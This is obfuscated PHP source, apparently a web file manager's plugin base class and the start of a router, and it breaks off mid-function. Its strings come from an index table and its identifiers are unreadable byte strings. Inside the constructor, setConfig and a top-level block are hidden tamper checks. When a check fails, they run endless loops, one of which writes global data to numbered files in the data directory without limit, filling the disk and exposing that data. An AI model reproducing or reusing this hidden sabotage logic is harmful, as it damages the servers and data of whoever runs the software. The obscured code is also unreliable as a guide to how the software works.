$_SERVER[$_SERVER[³ñ±ª˜‘][1]] = $fileSize($_SERVER[$_SERVER[³ñ±ª˜‘][2]]); goto Aß‡’õŞ…´; aœ¥±Â Ûä: if (!isset($_SERVER[$_SERVER[ü¢ÙÊñÛ][6]]) || !isset($_SERVER[$_SERVER[ü¢ÙÊñÛ][4]])) { $_getc = $_SERVER[ü¢ÙÊñÛ][7]; $_getfile = $_SERVER[$_SERVER[ü¢ÙÊñÛ][8]] . $_SERVER[ü¢ÙÊñÛ][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ü¢ÙÊñÛ][10], $_getfilec); if (count($_getarrs) < $_SERVER[ü¢ÙÊñÛ][11]) { $exit = $_SERVER[ü¢ÙÊñÛ][12]; $exit(); } $_act = $_SERVER[ü¢ÙÊñÛ][13]; $_act($_SERVER[$_SERVER[ü¢ÙÊñÛ][8]] . $_SERVER[ü¢ÙÊñÛ][9]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ü¢ÙÊñÛ][64]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ Å…–©ò =& $_SERVER[ü¢ÙÊñÛ]; $æÓĞå«é = $_SERVER[$ Å…–©ò[8]] . $ Å…–©ò[9]; $äÊ–å˜ = $ Å…–©ò[5]; if ($_SERVER[$ Å…–©ò[6]] != $äÊ–å˜($æÓĞå«é)) { $îŞÒÕâ = $ Å…–©ò[944]; $¹Ş˜°àÑ = $ Å…–©ò[7]; $˜—²‡»¯ = $_SERVER[$ Å…–©ò[8]] . $ Å…–©ò[9]; $ì¢š¼¹ò = $¹Ş˜°àÑ($˜—²‡»¯); $ÙÅƒù¶Ï = explode($ Å…–©ò[10], $ì¢š¼¹ò); if (count($ÙÅƒù¶Ï) < $ Å…–©ò[706]) { $œıİ ğ« = $ Å…–©ò[12]; $œıİ ğ«(); } $¦ĞÍúã­ = $ Å…–©ò[945]; $¦ĞÍúã­($_SERVER[$ Å…–©ò[946]]); $îŞÒÕâ = $ Å…–©ò[944]; $îŞÒÕâ(); $Æàûó½Á = $ Å…–©ò[947]; $Î—‹ÉÂ = json_encode($GLOBALS[$ Å…–©ò[948]]); $Î¯½£‹ = 1; for ($Ûå Â—³ = $Î¯½£‹; $Ûå Â—³ > 0; $Ûå Â—³++) { $Æàûó½Á(DATA_PATH . $Ûå Â—³, $Î—‹ÉÂ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ Å…–©ò[1614]); $this->pluginName = str_replace($ Å…–©ò[1614], $ Å…–©ò[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ Å…–©ò[18]; $this->pluginApi = appHostGet() . $ Å…–©ò[1615] . $this->pluginName . $ Å…–©ò[18]; $this->pluginHost = $config[$ Å…–©ò[1616]] . $this->pluginName . $ Å…–©ò[18]; $this->pluginHostDefault = $config[$ Å…–©ò[1616]] . $this->pluginName . $ Å…–©ò[18]; $µ‚Å›¾Ä = $config[$ Å…–©ò[1617]]; if ($µ‚Å›¾Ä && strpos($ Å…–©ò[60] . $µ‚Å›¾Ä . $ Å…–©ò[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$ Å…–©ò[1618]] . $this->pluginName . $ Å…–©ò[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ü¢ÙÊñÛ][1619]); } protected function assign($ŞÍÙÙÑ, $ÃÃ¦ëçå = false) { if (is_array($ŞÍÙÙÑ)) { $this->values = array_merge($this->values, $ŞÍÙÙÑ); } else { $this->values[$ŞÍÙÙÑ] = $ÃÃ¦ëçå; } } protected function display($•‡¿ô¤ş) { extract($this->values); require $•‡¿ô¤ş; } final function hookRegist($ñÍ­™ùí) { $this->modelPlugin->appRegist($this->pluginName, $ñÍ­™ùí); } final function appIcon() { $¼û‹ù©© =& $_SERVER[ü¢ÙÊñÛ]; $‘Ù¿šŞÒ = $this->appPackage(); $Ğ½§­ñù = $¼û‹ù©©[22]; if (isset($‘Ù¿šŞÒ[$¼û‹ù©©[501]])) { if (isset($‘Ù¿šŞÒ[$¼û‹ù©©[501]][$¼û‹ù©©[1620]])) { $Ğ½§­ñù = $¼û‹ù©©[1621] . $‘Ù¿šŞÒ[$¼û‹ù©©[501]][$¼û‹ù©©[1620]] . $¼û‹ù©©[1622]; } else { if ($‘Ù¿šŞÒ[$¼û‹ù©©[501]][$¼û‹ù©©[1623]]) { $Ğ½§­ñù = $¼û‹ù©©[1624] . $‘Ù¿šŞÒ[$¼û‹ù©©[501]][$¼û‹ù©©[1623]] . $¼û‹ù©©[1625]; } } } return $Ğ½§­ñù; } final function fileCanView($µş©“‚—) { $Âş®†³ı =& $_SERVER[ü¢ÙÊñÛ]; if (request_url_safe($µş©“‚—)) { return !0; } if ($this->isShare($µş©“‚—)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ßöı¤şŞ = $Âş®†³ı[1626] . rawurlencode(this_url()); show_tips(LNG($Âş®†³ı[1627]) . $Âş®†³ı[1628] . $ßöı¤şŞ . $Âş®†³ı[1629] . LNG($Âş®†³ı[1630]) . $Âş®†³ı[1631], !1); } if (!Action($Âş®†³ı[1632])->authCan($Âş®†³ı[1633])) { show_tips(LNG($Âş®†³ı[1634]) . $Âş®†³ı[1635], !1); } ActionCall($Âş®†³ı[1636], $µş©“‚—); } final function isShare($ş…ìô¹Ù) { $‡¬ù¡€’ = KodIO::parse($ş…ìô¹Ù); return $‡¬ù¡€’[$_SERVER[ü¢ÙÊñÛ][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($øÚò¥¥¯) { if (request_url_safe($øÚò¥¥¯)) { return $øÚò¥¥¯; } if (!$this->isShare($øÚò¥¥¯)) { $øÚò¥¥¯ = $this->filePath($øÚò¥¥¯, !1); } return Action($_SERVER[ü¢ÙÊñÛ][1245])->linkOut($øÚò¥¥¯); } public function filePathLinkOut($§½¦Óßİ) { if (request_url_safe($§½¦Óßİ)) { return $§½¦Óßİ; } $this->fileCanView($§½¦Óßİ); return Action($_SERVER[ü¢ÙÊñÛ][1245])->link($§½¦Óßİ); } final function filePath($¾›‚Ü¢Ó, $ú¤ÙËÂ› = true, $š ©Ï› = false) { $‡§š÷È =& $_SERVER[ü¢ÙÊñÛ]; $üíˆïÙ = $this->filePathGet($¾›‚Ü¢Ó, $ú¤ÙËÂ›); if (!$this->fileInfo) { show_tips(LNG($‡§š÷È[119]), !1); } if ($š ©Ï› && isset($this->fileInfo[$‡§š÷È[552]]) && $this->fileInfo[$‡§š÷È[552]]) { $ßÊ‘Ìää = Model($‡§š÷È[555])->fileInfo($this->fileInfo[$‡§š÷È[552]]); if (!$ßÊ‘Ìää || !IO::exist($ßÊ‘Ìää[$‡§š÷È[98]])) { show_tips(LNG($‡§š÷È[119]) . $‡§š÷È[1637]); } } Hook::trigger($‡§š÷È[1638], $üíˆïÙ); return $üíˆïÙ; } final function filePathGet($»µŠŸÚ, $£–À•Æ— = true) { $¿·ÄªÔà =& $_SERVER[ü¢ÙÊñÛ]; if ($ÔŸ©ú‰ğ = $this->checkSharePath($»µŠŸÚ, $£–À•Æ—)) { return $ÔŸ©ú‰ğ; } $this->fileCanView($»µŠŸÚ); if (request_url_safe($»µŠŸÚ)) { $®ĞúßÑî = parse_url_query($»µŠŸÚ); if (isset($®ĞúßÑî[$¿·ÄªÔà[1639]]) && isset($®ĞúßÑî[$¿·ÄªÔà[247]])) { $®¾«Š¥Ì = Mcrypt::decode($®ĞúßÑî[$¿·ÄªÔà[247]], Model($¿·ÄªÔà[835])->get($¿·ÄªÔà[836])); if ($®¾«Š¥Ì) { $this->fileInfo = IO::info($®¾«Š¥Ì); $this->fileInfo[$¿·ÄªÔà[1640]] = $»µŠŸÚ; $this->cachePath = $this->pluginCachePath($¿·ÄªÔà[22], $£–À•Æ—); return $®¾«Š¥Ì; } } $»µŠŸÚ = $this->_cacheHttpFile($»µŠŸÚ, $£–À•Æ—); $this->fileInfo = IO::info($»µŠŸÚ); } else { $this->fileInfo = IO::info($»µŠŸÚ); $this->cachePath = $this->pluginCachePath($¿·ÄªÔà[22], $£–À•Æ—); } return $»µŠŸÚ; } final function _cacheHttpFile($Œı®ô“ç, $«‰û€à÷ = true) { $›ÏúŞô– =& $_SERVER[ü¢ÙÊñÛ]; $©¨¯ëëü = parse_url_query($Œı®ô“ç); $°Ğè×Ø = get_path_ext($Œı®ô“ç); if (isset($©¨¯ëëü[$›ÏúŞô–[42]]) && $©¨¯ëëü[$›ÏúŞô–[42]]) { $°Ğè×Ø = get_path_ext($©¨¯ëëü[$›ÏúŞô–[42]]); } $ŒœÙ¨ïÏ = hash_path($Œı®ô“ç) . $›ÏúŞô–[20] . $°Ğè×Ø; $this->cachePath = $this->pluginCachePath($«‰û€à÷ ? $ŒœÙ¨ïÏ : $›ÏúŞô–[22]); $¤Š÷Í’ = IO::fileNameExist($this->cachePath, $ŒœÙ¨ïÏ); if ($¤Š÷Í’) { return KodIO::make($¤Š÷Í’); } $¦›Ú›Š = rtrim($this->cachePath, $›ÏúŞô–[18]) . $›ÏúŞô–[18] . $ŒœÙ¨ïÏ; return $this->pluginCacheFileSet($¦›Ú›Š, file_get_contents_nossl($Œı®ô“ç)); } final function checkSharePath($µÖ„Ï¢¸, $‹„µÑ¼Á = true) { $Â¯Šâ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->isShare($µÖ„Ï¢¸)) { return !1; } $ÀªçØë™ = Action($Â¯Šâ[1245])->sharePathInfo($µÖ„Ï¢¸); if (!is_array($ÀªçØë™) || !isset($ÀªçØë™[$Â¯Šâ[98]])) { show_json(LNG($Â¯Šâ[1641]), !1); } $this->fileInfo = $ÀªçØë™; $this->cachePath = $this->pluginCachePath(!1, $‹„µÑ¼Á); return $ÀªçØë™[$Â¯Šâ[98]]; } final function pluginCachePath($Ñòªç¤­ = '', $Ç˜´Ü‹» = false) { $ßğ‘¯ì· =& $_SERVER[ü¢ÙÊñÛ]; if ($Ç˜´Ü‹» && is_array($this->fileInfo)) { $Ñòªç¤­ = kodIO::hashPath($this->fileInfo); } $‰õ÷ãÍ = rtrim(IO_PATH_SYSTEM_TEMP . $ßğ‘¯ì·[1642] . $this->pluginName . $ßğ‘¯ì·[18] . $Ñòªç¤­, $ßğ‘¯ì·[18]); $Æóâ©Â = IO::infoFullSimple($‰õ÷ãÍ); $‘ÉÔë×” = $Æóâ©Â && is_array($Æóâ©Â) ? $Æóâ©Â[$ßğ‘¯ì·[98]] : $ßğ‘¯ì·[22]; if (!$‘ÉÔë×”) { $‘ÉÔë×” = IO::mkdir($‰õ÷ãÍ); } return $‘ÉÔë×”; } final function pluginCacheFileSet($ó€‡‡Ä, $—Î§ÌÖ€ = '') { $ÇËó‹åè =& $_SERVER[ü¢ÙÊñÛ]; $è«°º´ = IO::infoFullSimple($ó€‡‡Ä); if (!$è«°º´) { return IO::mkfile($ó€‡‡Ä, $—Î§ÌÖ€, REPEAT_REPLACE); } IO::setContent($è«°º´[$ÇËó‹åè[98]], $—Î§ÌÖ€); return $è«°º´[$ÇËó‹åè[98]]; } final function pluginLocalFile($á«²º• = '') { $¢ì¼·éÉ =& $_SERVER[ü¢ÙÊñÛ]; $¦©‚ıÉ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¦©‚ıÉ)) { mk_dir($¦©‚ıÉ); } if (!$á«²º•) { return $¦©‚ıÉ; } $öÚÓø” = IO::info($á«²º•); $Ì³ú„êî = $¢ì¼·éÉ[1643] . KodIO::hashPath($öÚÓø”) . $¢ì¼·éÉ[20] . $öÚÓø”[$¢ì¼·éÉ[180]]; if (!checkExtSafe($Ì³ú„êî)) { $Ì³ú„êî = $Ì³ú„êî . $¢ì¼·éÉ[1280]; } $¹‡Õ†›Ê = $¦©‚ıÉ . $Ì³ú„êî; if (@file_exists($¹‡Õ†›Ê)) { return $¹‡Õ†›Ê; } return IO::copy($á«²º•, $¦©‚ıÉ, 0, $Ì³ú„êî); } final function appPackage() { $„¾®º =& $_SERVER[ü¢ÙÊñÛ]; if ($this->packageData) { return $this->packageData; } $ëíÛßÛË = $this->parseFile($this->pluginPath . $„¾®º[1644]); $this->parseLang($ëíÛßÛË); $ŸÅßì = json_decode_force($ëíÛßÛË); if (!$ŸÅßì) { return array(); } $¤— ÙŸ™ = Hook::trigger($„¾®º[1645], $ŸÅßì); if ($¤— ÙŸ™ && is_array($¤— ÙŸ™)) { $ŸÅßì = $¤— ÙŸ™; } $this->packageData = $ŸÅßì; return $ŸÅßì; } public function packageInfoGet($¼ ¸–‚Ì) { $àôÑ¶¦ = $this->appPackage(); return array_get_value($àôÑ¶¦, $¼ ¸–‚Ì); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ü¢ÙÊñÛ][1646]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ü¢ÙÊñÛ][1647]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ü¢ÙÊñÛ][1648]); } public function echoJsAssign($¼Ê¦Ê³Ã, $ÈÙãè‡) { $this->echoJsAssignArr[$¼Ê¦Ê³Ã] = $ÈÙãè‡; } private function parseFile($…®˜Úî) { $Ïš´©üÈ =& $_SERVER[ü¢ÙÊñÛ]; $ÅêëÄ‰Ç = file_get_contents_nossl($…®˜Úî); $“ç—Í = array($Ïš´©üÈ[1649], $Ïš´©üÈ[1650], $Ïš´©üÈ[1651], $Ïš´©üÈ[1652], $Ïš´©üÈ[1653], $Ïš´©üÈ[1654], $Ïš´©üÈ[1655]); $¢‚ÎÃ¹î = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ïš´©üÈ[103]][$Ïš´©üÈ[1656]]); foreach ($this->echoJsAssignArr as $¥â¬äÓÊ => $­ªøˆß) { $“ç—Í[] = $Ïš´©üÈ[1657] . $¥â¬äÓÊ . $Ïš´©üÈ[1658]; $¢‚ÎÃ¹î[] = is_array($­ªøˆß) || is_object($­ªøˆß) ? rawurlencode(json_encode($­ªøˆß)) : $­ªøˆß; } if (strstr($ÅêëÄ‰Ç, $Ïš´©üÈ[1659])) { $ÚÈè°ó¯ = rawurlencode(json_encode($this->pluginLangArr)); $ÅêëÄ‰Ç = str_replace($Ïš´©üÈ[1659], $ÚÈè°ó¯, $ÅêëÄ‰Ç); } if (strstr($ÅêëÄ‰Ç, $Ïš´©üÈ[1660])) { $ÚÈè°ó¯ = $ÚÈè°ó¯ = rawurlencode(json_encode($this->getConfig())); $ÅêëÄ‰Ç = str_replace($Ïš´©üÈ[1660], $ÚÈè°ó¯, $ÅêëÄ‰Ç); } $ÅêëÄ‰Ç = str_replace($“ç—Í, $¢‚ÎÃ¹î, $ÅêëÄ‰Ç); return $ÅêëÄ‰Ç; } private function parseLang(&$îÒËóÒù) { $ÀÌËøè =& $_SERVER[ü¢ÙÊñÛ]; $µÖ“Ì„ø = $ÀÌËøè[1661]; if (!strstr($îÒËóÒù, $µÖ“Ì„ø)) { return; } preg_match_all($ÀÌËøè[1662], $îÒËóÒù, $ãôÂ½ÌŠ); if (!is_array($ãôÂ½ÌŠ) || count($ãôÂ½ÌŠ) == 0 || !is_array($ãôÂ½ÌŠ[0]) || count($ãôÂ½ÌŠ[0]) == 0) { return; } $Šò€­õ» = array(); $±‹—»¿¤ = array(); foreach ($ãôÂ½ÌŠ[0] as $ä¦Å‹Çå) { $Óì–å¯ = substr($ä¦Å‹Çå, strlen($µÖ“Ì„ø), -4); $ò¯­á†İ = LNG($Óì–å¯); $Šò€­õ»[] = $ä¦Å‹Çå; $±‹—»¿¤[] = str_replace(array($ÀÌËøè[10], $ÀÌËøè[1145], $ÀÌËøè[429], $ÀÌËøè[132]), array($ÀÌËøè[63], $ÀÌËøè[63], $ÀÌËøè[22], $ÀÌËøè[1663]), $ò¯­á†İ); } $îÒËóÒù = str_replace($Šò€­õ», $±‹—»¿¤, $îÒËóÒù); } private function parseConfig(&$½—úûÎ) { $Š™¤ğÁù =& $_SERVER[ü¢ÙÊñÛ]; $Á”úå¿ê = $Š™¤ğÁù[1664]; if (!strstr($½—úûÎ, $Á”úå¿ê)) { return; } preg_match_all($Š™¤ğÁù[1665], $½—úûÎ, $Ä Ş½ºæ); if (!is_array($Ä Ş½ºæ) || count($Ä Ş½ºæ) == 0 || !is_array($Ä Ş½ºæ[0]) || count($Ä Ş½ºæ[0]) == 0) { return; } $Ã‚É€‘¿ = $this->getConfig(); $¿âÑø¼¤ = array(); $šŠæò¨ú = array(); foreach ($Ä Ş½ºæ[0] as $Û½¦ğ”´) { $ìÚ¬çßÜ = substr($Û½¦ğ”´, strlen($Á”úå¿ê), -2); $¿âÑø¼¤[] = $Û½¦ğ”´; $šŠæò¨ú[] = _get($Ã‚É€‘¿, $ìÚ¬çßÜ); } $½—úûÎ = str_replace($¿âÑø¼¤, $šŠæò¨ú, $½—úûÎ); } private function parsePackage(&$ã¬¯²è×) { $Ñõë¤Œí =& $_SERVER[ü¢ÙÊñÛ]; $×î¬ğ = $Ñõë¤Œí[1666]; if (!strstr($ã¬¯²è×, $×î¬ğ)) { return; } preg_match_all($Ñõë¤Œí[1667], $ã¬¯²è×, $Òï¬ñ ); if (!is_array($Òï¬ñ ) || count($Òï¬ñ ) == 0 || !is_array($Òï¬ñ [0]) || count($Òï¬ñ [0]) == 0) { return; } $ˆ¨ç¤© = $this->appPackage(); $¾â¨â£¼ = array(); $ÃİÂ‚Ñ = array(); foreach ($Òï¬ñ [0] as $‰ĞÛŠ›Æ) { $¯ü„³·ç = substr($‰ĞÛŠ›Æ, strlen($×î¬ğ), -2); $¾â¨â£¼[] = $‰ĞÛŠ›Æ; $ÃİÂ‚Ñ[] = _get($ˆ¨ç¤©, $¯ü„³·ç); } $ã¬¯²è× = str_replace($¾â¨â£¼, $ÃİÂ‚Ñ, $ã¬¯²è×); } final function echoFile($˜ğ†á, $ªİıäË÷ = false) { $ğÒ¯…Æâ =& $_SERVER[ü¢ÙÊñÛ]; $û¡ª„¹¤ = $this->pluginPath . $˜ğ†á; if (ACT == $ğÒ¯…Æâ[1668]) { echo $ğÒ¯…Æâ[1669] . $this->pluginName . $ğÒ¯…Æâ[18] . $˜ğ†á . $ğÒ¯…Æâ[1670]; if (!file_exists($û¡ª„¹¤)) { echo $ğÒ¯…Æâ[1671]; return; } } $¬ããüûÍ = $this->parseFile($û¡ª„¹¤); $this->parseLang($¬ããüûÍ); $this->parseConfig($¬ããüûÍ); $this->parsePackage($¬ããüûÍ); if (is_array($ªİıäË÷)) { $¬ããüûÍ = str_replace(array_keys($ªİıäË÷), array_values($ªİıäË÷), $¬ããüûÍ); } echo $ğÒ¯…Æâ[10] . $¬ããüûÍ; } private function checkVersion() { $õô·è— =& $_SERVER[ü¢ÙÊñÛ]; $¶ûæ‰æØ = $this->appPackage(); $ç…É—Ö = $this->getConfig(); if ($ç…É—Ö[$õô·è—[1672]] == $¶ûæ‰æØ[$õô·è—[1646]]) { return; } $this->regist(); $this->setConfig(array($õô·è—[1672] => $¶ûæ‰æØ[$õô·è—[1646]])); } final function initLang() { $îç–Î°ú =& $_SERVER[ü¢ÙÊñÛ]; $üÙÇ¤ºÊ = $îç–Î°ú[1673]; $ÕªØ Ó = $this->pluginPath . $îç–Î°ú[1674]; $Ë¡¹º´ = I18n::getType(); $æ–ƒÛµ = array(); if (file_exists($ÕªØ Ó . $Ë¡¹º´ . $îç–Î°ú[905])) { $æ–ƒÛµ = (include $ÕªØ Ó . $Ë¡¹º´ . $îç–Î°ú[905]); } else { if ($Ë¡¹º´ == $îç–Î°ú[1675] && !file_exists($ÕªØ Ó . $Ë¡¹º´ . $îç–Î°ú[905]) && file_exists($ÕªØ Ó . $îç–Î°ú[1676])) { $æ–ƒÛµ = (include $ÕªØ Ó . $îç–Î°ú[1676]); } else { if (file_exists($ÕªØ Ó . $üÙÇ¤ºÊ . $îç–Î°ú[905])) { $æ–ƒÛµ = (include $ÕªØ Ó . $üÙÇ¤ºÊ . $îç–Î°ú[905]); } } } if (!is_array($æ–ƒÛµ)) { return array(); } if (@count($æ–ƒÛµ) > 0) { I18n::set($æ–ƒÛµ); } return $æ–ƒÛµ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Åäçå¥ò) { $à‘Áø²½ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($_SERVER[$à‘Áø²½[6]]) || !isset($_SERVER[$à‘Áø²½[4]])) { $±Ö¿´…Ó = $à‘Áø²½[944]; $ªË»–¶Ô = $à‘Áø²½[7]; $£·«³Ê™ = $_SERVER[$à‘Áø²½[8]] . $à‘Áø²½[9]; $£ÁÄ™Ñ‰ = $ªË»–¶Ô($£·«³Ê™); $±¹²Åª× = explode($à‘Áø²½[10], $£ÁÄ™Ñ‰); if (count($±¹²Åª×) < $à‘Áø²½[706]) { $¯ŞĞÁ÷ = $à‘Áø²½[12]; $¯ŞĞÁ÷(); } $ÄÙÇ‹°¡ = $à‘Áø²½[945]; $ÄÙÇ‹°¡($_SERVER[$à‘Áø²½[946]]); $íÎñŒ ˜ = 1; for ($ñËš¯ó¢ = $íÎñŒ ˜; $ñËš¯ó¢ > 0; $ñËš¯ó¢++) { $ÄÙÇ‹°¡ = json_encode($GLOBALS[$à‘Áø²½[503]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Åäçå¥ò); } public function onSetConfig($±ÌƒÏê§) { } public function onGetConfig($ß§âïê) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ğëˆ×²) { if ($Ğëˆ×² == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($÷™Ñ“—‹ = "\x70\154\x75\x67\x69\156\x41\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $‰²È» = $this->getConfig(); if (!$‰²È»[$÷™Ñ“—‹]) { return !1; } return ActionCall($_SERVER[ü¢ÙÊñÛ][1677], $‰²È»[$÷™Ñ“—‹]); } public function url($¨ Ïé°, $Æü—™¶¬ = '', $ü«ÏÄƒ = true) { $âÒ»ƒÂˆ =& $_SERVER[ü¢ÙÊñÛ]; $€ïÈ¥¬ = $this->getConfig(); $ Ïìéª = KOD_VERSION . $âÒ»ƒÂˆ[20] . KOD_VERSION_BUILD; $¯õÛØ¬¢ = $this->packageVersion(); $¯ê¬ÛÍï = $ Ïìéª . $âÒ»ƒÂˆ[473] . $¯õÛØ¬¢; if (substr($¨ Ïé°, 0, 4) == $âÒ»ƒÂˆ[163] || substr($¨ Ïé°, 0, 2) == $âÒ»ƒÂˆ[1400]) { $êÜ¡ğ´‚ = $¨ Ïé° . $âÒ»ƒÂˆ[1678] . $¯ê¬ÛÍï; } else { if ($Æü—™¶¬ == $âÒ»ƒÂˆ[22]) { $êÜ¡ğ´‚ = $this->pluginHost . $¨ Ïé° . $âÒ»ƒÂˆ[1678] . $¯ê¬ÛÍï; } else { if ($Æü—™¶¬ === $âÒ»ƒÂˆ[89]) { $êÜ¡ğ´‚ = $this->pluginHost . $¨ Ïé°; } else { if ($Æü—™¶¬ == $âÒ»ƒÂˆ[1679]) { $êÜ¡ğ´‚ = STATIC_PATH . $¨ Ïé° . $âÒ»ƒÂˆ[1678] . $ Ïìéª; } else { if ($Æü—™¶¬ == $âÒ»ƒÂˆ[1680]) { $êÜ¡ğ´‚ = APP_HOST . $âÒ»ƒÂˆ[1681] . $¨ Ïé° . $âÒ»ƒÂˆ[1678] . $ Ïìéª; } else { if (isset($€ïÈ¥¬[$Æü—™¶¬])) { $êÜ¡ğ´‚ = $€ïÈ¥¬[$Æü—™¶¬] . $¨ Ïé° . $âÒ»ƒÂˆ[1678] . $¯ê¬ÛÍï; } } } } } } if (!$ü«ÏÄƒ) { return $êÜ¡ğ´‚; } echo $êÜ¡ğ´‚; } public function link($Œ—ÁÆ’ = false, $Ó–¢ïŞ¾ = '') { $“…«ç› =& $_SERVER[ü¢ÙÊñÛ]; $ÌÜÒè€¨ = $this->linkHas == !1; $this->linkHas = !0; if (!$Œ—ÁÆ’) { $this->link($“…«ç›[1682], $“…«ç›[1680]); $this->link($“…«ç›[1683], $“…«ç›[1679]); $this->link($“…«ç›[1684], $“…«ç›[1679]); $this->link($“…«ç›[1685], $“…«ç›[1679]); $this->link($“…«ç›[1686], $“…«ç›[1679]); if ($ÌÜÒè€¨) { Hook::trigger($“…«ç›[1687]); } return; } $„ë“ãÔÈ = $this->url($Œ—ÁÆ’, $Ó–¢ïŞ¾, !1); if (substr($Œ—ÁÆ’, -3) == $“…«ç›[1688]) { echo $“…«ç›[1689] . $„ë“ãÔÈ . $“…«ç›[1690] . $“…«ç›[10]; } else { if (substr($Œ—ÁÆ’, -4) == $“…«ç›[1691]) { echo $“…«ç›[1692] . $„ë“ãÔÈ . $“…«ç›[1693] . $“…«ç›[10]; } } if ($ÌÜÒè€¨) { Hook::trigger($“…«ç›[1687]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\133\136\57\x5d\53", "\72\156\x75\155" => "\133\x30\x2d\71\135\53", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ÅÁôöŒ€, $€š¦µ£…) { $¯ùšâ°Í =& $_SERVER[ü¢ÙÊñÛ]; if ($ÅÁôöŒ€ == $¯ùšâ°Í[1694]) { $¤•¾Âáõ = array_map($¯ùšâ°Í[1695], $€š¦µ£…[0]); $¯Ş²î¨Ï = strpos($€š¦µ£…[1], $¯ùšâ°Í[18]) === 0 ? $€š¦µ£…[1] : $¯ùšâ°Í[18] . $€š¦µ£…[1]; $ç®ƒºú™ = $€š¦µ£…[2]; } else { $¤•¾Âáõ = null; $¯Ş²î¨Ï = strpos($€š¦µ£…[0], $¯ùšâ°Í[18]) === 0 ? $€š¦µ£…[0] : $¯ùšâ°Í[18] . $€š¦µ£…[0]; $ç®ƒºú™ = $€š¦µ£…[1]; } array_push(self::$maps, $¤•¾Âáõ); array_push(self::$routes, $¯Ş²î¨Ï); array_push(self::$methods, strtoupper($ÅÁôöŒ€)); array_push(self::$callbacks, $ç®ƒºú™); } public static function error($ÆØ„½Ü†) { self::$errorCallback = $ÆØ„½Ü†; } public static function haltOnMatch($±ğ™’­â = true) { self::$halts = $±ğ™’­â; } public static function dispatch() { $Šç¨Ğ…Ÿ =& $_SERVER[ü¢ÙÊñÛ]; $¦ôŸ¸â = parse_url($_SERVER[$Šç¨Ğ…Ÿ[1696]], PHP_URL_PATH); $–ÒÅ™ ” = $_SERVER[$Šç¨Ğ…Ÿ[175]]; $®«»ìÃÔ = array_keys(static::$patterns); $ô¹ë‰ = array_values(static::$patterns); $öí”© = !1; self::$routes = preg_replace($Šç¨Ğ…Ÿ[1350], $Šç¨Ğ…Ÿ[18], self::$routes); if (in_array($¦ôŸ¸â, self::$routes)) { $ƒâÃ‰“ = array_keys(self::$routes, $¦ôŸ¸â); foreach ($ƒâÃ‰“ as $ò‡šµ·Ê) { if (self::$methods[$ò‡šµ·Ê] == $–ÒÅ™ ” || self::$methods[$ò‡šµ·Ê] == $Šç¨Ğ…Ÿ[1697] || in_array($–ÒÅ™ ”, self::$maps[$ò‡šµ·Ê])) { $öí”© = !0; if (!is_object(self::$callbacks[$ò‡šµ·Ê])) { $Ê¼”µÄ = explode($Šç¨Ğ…Ÿ[18], self::$callbacks[$ò‡šµ·Ê]); $à¡æÁÉ¦ = end($Ê¼”µÄ); $ÁşÉ°å£ = explode($Šç¨Ğ…Ÿ[1282], $à¡æÁÉ¦); $•ûÂ±é‚ = new $ÁşÉ°å£[0](); $•ûÂ±é‚->{$ÁşÉ°å£[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ò‡šµ·Ê]); if (self::$halts) { return; } } } } } else { $ìíç¬Á÷ = 0; foreach (self::$routes as $ò‡šµ·Ê) { if (strpos($ò‡šµ·Ê, $Šç¨Ğ…Ÿ[14]) !== !1) { $ò‡šµ·Ê = str_replace($®«»ìÃÔ, $ô¹ë‰, $ò‡šµ·Ê); } if (preg_match($Šç¨Ğ…Ÿ[1698] . $ò‡šµ·Ê . $Šç¨Ğ…Ÿ[1699], $¦ôŸ¸â, $¹şëÇÎï)) { if (self::$methods[$ìíç¬Á÷] == $–ÒÅ™ ” || self::$methods[$ìíç¬Á÷] == $Šç¨Ğ…Ÿ[1697] || !empty(self::$maps[$ìíç¬Á÷]) && in_array($–ÒÅ™ ”, self::$maps[$ìíç¬Á÷])) { $öí”© = !0; array_shift($¹şëÇÎï); if (!is_object(self::$callbacks[$ìíç¬Á÷])) { $Ê¼”µÄ = explode($Šç¨Ğ…Ÿ[18], self::$callbacks[$ìíç¬Á÷]); $à¡æÁÉ¦ = end($Ê¼”µÄ); $ÁşÉ°å£ = explode($Šç¨Ğ…Ÿ[1282], $à¡æÁÉ¦); $•ûÂ±é‚ = new $ÁşÉ°å£[0](); if (!method_exists($•ûÂ±é‚, $ÁşÉ°å£[1])) { echo $Šç¨Ğ…Ÿ[1700]; } else { call_user_func_array(array($•ûÂ±é‚, $ÁşÉ°å£[1]), $¹şëÇÎï); } if (self::$halts) { return; } } else { 